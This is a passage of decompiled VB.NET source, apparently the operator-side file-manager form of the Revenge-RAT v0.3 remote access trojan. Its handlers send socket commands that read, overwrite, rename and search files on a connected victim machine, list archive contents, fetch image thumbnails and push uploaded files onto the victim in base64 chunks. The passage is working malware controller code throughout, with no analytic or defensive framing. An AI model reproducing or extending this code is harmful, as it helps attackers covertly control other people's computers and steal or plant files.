    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.Files.Items.Clear()
        Me.RefreshList()
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        Me.ListView2.Items.Clear()
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Getrarfilesinside" & My.Forms.Main.Key), Me.R)}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        Me.ListView2.Enabled = False
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
    End Sub

    Private Sub RemoveAllCompletedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveAllCompletedToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Downloads.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(4).Text = "Finished") Then
                    current.Remove()
                End If
                If (current.SubItems.Item(4).Text = "Stopped") Then
                    current.Remove()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Files.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(0).Text <> "...") Then
                    Dim input As String = Interaction.InputBox("Enter New Name", "Rename", current.SubItems.Item(0).Text, -1, -1)
                    If (input <> "") Then
                        Dim flagArray As Boolean()
                        If (Me.Files.FocusedItem.ImageIndex = 0) Then
                            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("Rename" & My.Forms.Main.Key) & "Folder" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), SocketServer.Encode(input))}
                            flagArray = New Boolean() {True, False}
                            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                            End If
                        Else
                            Dim objArray As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("Rename" & My.Forms.Main.Key) & "File" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text))), My.Forms.Main.Key), SocketServer.Encode(input))}
                            flagArray = New Boolean() {True, False}
                            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                            End If
                        End If
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ResumeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Downloads.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(4).Text = "Suspend") Then
                    My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), "Resume")
                    current.SubItems.Item(4).Text = "Downloading"
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RF_KeyDown(sender As Object, e As KeyEventArgs) Handles RF.KeyDown
        If ((Me.RF.Text.Length > 0) AndAlso (e.KeyCode = Keys.Enter)) Then
            If Me.RF.Multiline Then
                Me.RF.Multiline = False
            End If
            If (((((((((((((((((((((((((((((Me.RF.Text.EndsWith(".zip") Or Me.RF.Text.EndsWith(".ZIP")) Or Me.RF.Text.EndsWith(".rar")) Or Me.RF.Text.EndsWith(".RAR")) Or Me.RF.Text.EndsWith(".7z")) Or Me.RF.Text.EndsWith(".7Z")) Or Me.RF.Text.EndsWith(".jar")) Or Me.RF.Text.EndsWith(".JAR")) Or Me.RF.Text.EndsWith(".tar")) Or Me.RF.Text.EndsWith(".TAR")) Or Me.RF.Text.EndsWith(".tgz")) Or Me.RF.Text.EndsWith(".TGZ")) Or Me.RF.Text.EndsWith(".gz")) Or Me.RF.Text.EndsWith(".GZ")) Or Me.RF.Text.EndsWith(".bz2")) Or Me.RF.Text.EndsWith(".BZ2")) Or Me.RF.Text.EndsWith(".tbz2")) Or Me.RF.Text.EndsWith(".TBZ2")) Or Me.RF.Text.EndsWith(".gzip")) Or Me.RF.Text.EndsWith(".GZIP")) Or Me.RF.Text.EndsWith(".z")) Or Me.RF.Text.EndsWith(".Z")) Or Me.RF.Text.EndsWith(".sit")) Or Me.RF.Text.EndsWith(".SIT")) Or Me.RF.Text.EndsWith(".cab")) Or Me.RF.Text.EndsWith(".CAB")) Or Me.RF.Text.EndsWith(".lzh")) Or Me.RF.Text.EndsWith(".LZH")) Or Me.RF.Text.EndsWith(".pkg")) Or Me.RF.Text.EndsWith(".PKG")) Then
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("RARFiles" & My.Forms.Main.Key), SocketServer.Encode(Me.RF.Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            End If
            If Not Me.RF.Multiline Then
                Me.RF.Multiline = True
            End If
            Me.GRF.Enabled = False
            Me.RF.Enabled = False
        End If
    End Sub
    Public Sub RT()
        If (Me.TextPath.Text.Length > 0) Then
            Me.rat.Text = Nothing
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("ReadAllText" & My.Forms.Main.Key), SocketServer.Encode(Me.TextPath.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.TextPath.Enabled = False
            Me.Go.Enabled = False
            Me.rat.Text = Nothing
            Me.rat.Enabled = False
            Me.Save.Enabled = False
            Me.ToolStripStatusLabel9.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub Save_Click(sender As Object, e As EventArgs) Handles Save.Click
        If (Me.TextPath.Text.Length > 0) Then
            Me.TextPath.Enabled = False
            Me.Go.Enabled = False
            Me.rat.Enabled = False
            Me.Save.Enabled = False
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("SaveText" & My.Forms.Main.Key), SocketServer.Encode(Me.rat.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.TextPath.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub StartS_Click(sender As Object, e As EventArgs) Handles StartS.Click
        If (Me.SPath.Text.Length = 0) Then
            MessageBox.Show("You can't leave path empty!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End If
        If (Me.SPath.Text.Length = 0) Then
            MessageBox.Show("You can't leave file name empty!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End If
        Me.SearchFiles.Items.Clear()
        Me.SPath.Enabled = False
        Me.FileName.Enabled = False
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Search" & My.Forms.Main.Key), SocketServer.Encode(Me.SPath.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.FileName.Text))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        Me.StartS.Enabled = False
        Me.SearchFiles.Enabled = False
        Me.ToolStripStatusLabel6.Text = "Please wait a moment ..."
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Downloads.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.SubItems.Item(4).Text = "Downloading") Or (current.SubItems.Item(4).Text = "Wating")) Then
                    My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), "Abort")
                    current.SubItems.Item(4).Text = "Stopped"
                    Try
                        If File.Exists((Me.Path & current.SubItems.Item(0).Text & ".Revenge")) Then
                            File.Delete((Me.Path & current.SubItems.Item(0).Text & ".Revenge"))
                        End If
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        ProjectData.ClearProjectError()
                    End Try
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub TextPath_KeyDown(sender As Object, e As KeyEventArgs) Handles TextPath.KeyDown
        If ((Me.TextPath.Text.Length > 0) AndAlso (e.KeyCode = Keys.Enter)) Then
            If Me.TextPath.Multiline Then
                Me.TextPath.Multiline = False
            End If
            Me.rat.Text = Nothing
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("ReadAllText" & My.Forms.Main.Key), SocketServer.Encode(Me.TextPath.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.TextPath.Enabled = False
            Me.Go.Enabled = False
            Me.rat.Text = Nothing
            Me.rat.Enabled = False
            Me.Save.Enabled = False
            Me.ToolStripStatusLabel9.Text = "Please wait a moment ..."
            If Not Me.TextPath.Multiline Then
                Me.TextPath.Multiline = True
            End If
        End If
    End Sub

    Private Sub ThumbnailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ThumbnailsToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        If (Me.Lim1.Items.Count > 0) Then
            Me.Lim1.Items.Clear()
        End If
        Me.ToolStripStatusLabel5.Text = "Total items ( 0 )"
        Me.UltimatumTabControl1.SelectedIndex = 2
        Try
            enumerator = Me.Files.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (((((((((((((((((((((((((((((current.SubItems.Item(0).Text.EndsWith(".jpg") Or current.SubItems.Item(0).Text.EndsWith(".JPG")) Or current.SubItems.Item(0).Text.EndsWith(".jpeg")) Or current.SubItems.Item(0).Text.EndsWith(".JPEG")) Or current.SubItems.Item(0).Text.EndsWith(".ico")) Or current.SubItems.Item(0).Text.EndsWith(".ICO")) Or current.SubItems.Item(0).Text.EndsWith(".svg")) Or current.SubItems.Item(0).Text.EndsWith(".SVG")) Or current.SubItems.Item(0).Text.EndsWith(".svgz")) Or current.SubItems.Item(0).Text.EndsWith(".SVGZ")) Or current.SubItems.Item(0).Text.EndsWith(".drw")) Or current.SubItems.Item(0).Text.EndsWith(".DRW")) Or current.SubItems.Item(0).Text.EndsWith(".psp")) Or current.SubItems.Item(0).Text.EndsWith(".PSP")) Or current.SubItems.Item(0).Text.EndsWith(".gif")) Or current.SubItems.Item(0).Text.EndsWith(".GIF")) Or current.SubItems.Item(0).Text.EndsWith(".png")) Or current.SubItems.Item(0).Text.EndsWith(".PNG")) Or current.SubItems.Item(0).Text.EndsWith(".bmp")) Or current.SubItems.Item(0).Text.EndsWith(".BMP")) Or current.SubItems.Item(0).Text.EndsWith(".dib")) Or current.SubItems.Item(0).Text.EndsWith(".DIB")) Or current.SubItems.Item(0).Text.EndsWith(".jpe")) Or current.SubItems.Item(0).Text.EndsWith(".JPE")) Or current.SubItems.Item(0).Text.EndsWith(".jfif")) Or current.SubItems.Item(0).Text.EndsWith(".JFIF")) Or current.SubItems.Item(0).Text.EndsWith(".tif")) Or current.SubItems.Item(0).Text.EndsWith(".TIF")) Or current.SubItems.Item(0).Text.EndsWith(".tiff")) Or current.SubItems.Item(0).Text.EndsWith(".TIFF")) Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("viewimage" & My.Forms.Main.Key), SocketServer.Encode((Me.Pathloc.Text & current.SubItems.Item(0).Text)))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub TitleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TitleToolStripMenuItem.Click
        Me.Files.View = View.Tile
        Me.Files.FullRowSelect = False
        Me.DetailsToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = False
        Me.TitleToolStripMenuItem.Checked = True
        Me.ListToolStripMenuItem.Checked = False
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Downloads.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (Operators.ConditionalCompareObjectEqual(current.Tag, "Up", False) AndAlso ((current.SubItems.Item(4).Text = "Wating") Or (current.SubItems.Item(4).Text = "Uploading"))) Then
                    MessageBox.Show("Wait until the first upload finished! Revenge does not support multi upload file!", "Wait!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                    Return
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Try
            Dim dialog As New OpenFileDialog
            dialog.ShowDialog()

            If (dialog.FileName.Length > 0) Then
                Dim info As New FileInfo(dialog.FileName)
                If File.Exists((Interaction.Environ("Temp") & "\RevengeRATFM\" & IO.Path.GetExtension(dialog.FileName) & ".ico")) Then
                    Me.ImageList1.Images.Add(IO.Path.GetExtension(dialog.FileName), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & IO.Path.GetExtension(dialog.FileName) & ".ico")))
                Else
                    Try
                        File.Create(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", IO.Path.GetExtension(dialog.FileName), " File.", IO.Path.GetExtension(dialog.FileName)})).Close()
                        Dim icon As Icon = Icon.ExtractAssociatedIcon(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", IO.Path.GetExtension(dialog.FileName), " File.", IO.Path.GetExtension(dialog.FileName)}))
                        Dim icon3 As SingleIcon = New MultiIcon().Add(IO.Path.GetExtension(dialog.FileName))
                        icon3.CreateFrom(icon.ToBitmap, IconOutputFormat.Vista)
                        icon3.Save((Interaction.Environ("Temp") & "\RevengeRATFM\" & IO.Path.GetExtension(dialog.FileName) & ".ico"))
                        Me.ImageList1.Images.Add(IO.Path.GetExtension(dialog.FileName), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & IO.Path.GetExtension(dialog.FileName) & ".ico")))
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Me.ImageList1.Images.Add(IO.Path.GetExtension(dialog.FileName), New Bitmap(Me.ImageList1.Images.Item(1)))
                        ProjectData.ClearProjectError()
                    End Try
                End If
                Dim item2 As ListViewItem = Me.Downloads.Items.Add(IO.Path.GetExtension(dialog.FileName), info.Name, IO.Path.GetExtension(dialog.FileName))
                item2.SubItems.Add(SocketServer.GetSize(CULng(info.Length)))
                item2.SubItems.Add(IO.Path.GetExtension(dialog.FileName))
                item2.SubItems.Add("-")
                item2.SubItems.Add("Wating")
                item2.Tag = "Up"
                Dim text As String = Me.Pathloc.Text
                Try
                    Dim str As String = Convert.ToBase64String(SocketServer.Compress(File.ReadAllBytes(info.FullName)))
                    Dim length As Integer = str.Length
                    Dim num4 As Integer = 10
                    Dim num2 As Integer = CInt(Math.Round(CDbl((CDbl(length) / CDbl(num4)))))
                    Dim start As Integer = 1
                    Dim num6 As Integer = (num4 + 1)
                    Dim i As Integer = 1
                    Do While (i <= num6)
                        Dim str3 As String = Strings.Mid(str, start, num2)
                        My.Forms.Main.s.Send(Me.sock, String.Concat(New String() {"Up", My.Forms.Main.Key, str3, My.Forms.Main.Key, Conversions.ToString(i)}))
                        start = (start + num2)
                        i += 1
                    Loop
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("C" & My.Forms.Main.Key), SocketServer.Encode([text])), My.Forms.Main.Key), SocketServer.Encode(IO.Path.GetFileName(info.FullName)))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Catch exception3 As Exception
                    ProjectData.SetProjectError(exception3)
                    Dim exception As Exception = exception3
                    MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                    ProjectData.ClearProjectError()
                End Try
            End If
        Catch exception4 As Exception
            ProjectData.SetProjectError(exception4)
            Dim exception2 As Exception = exception4
            MessageBox.Show(exception2.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            ProjectData.ClearProjectError()
        End Try
    End Sub
End Class